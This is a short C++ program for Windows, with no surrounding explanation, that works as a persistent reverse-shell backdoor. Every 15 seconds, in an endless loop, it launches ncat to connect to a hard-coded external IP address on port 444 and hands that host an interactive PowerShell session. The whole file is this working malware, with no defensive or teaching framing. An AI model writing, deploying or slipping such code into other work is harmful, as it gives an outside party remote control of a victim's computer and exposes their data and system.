#include <Windows.h>
#include <string>

int main()
{
  char command[] = "./src/ncat.exe 49.187.85.189 444 -e powershell.exe";
  STARTUPINFO info={sizeof(info)};
  PROCESS_INFORMATION processInfo;

  while(1) {
    Sleep(15000);

    CreateProcess(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &info, &processInfo);
    WaitForSingleObject(processInfo.hProcess, INFINITE);

    CloseHandle(processInfo.hProcess);
    CloseHandle(processInfo.hThread);

  }
}
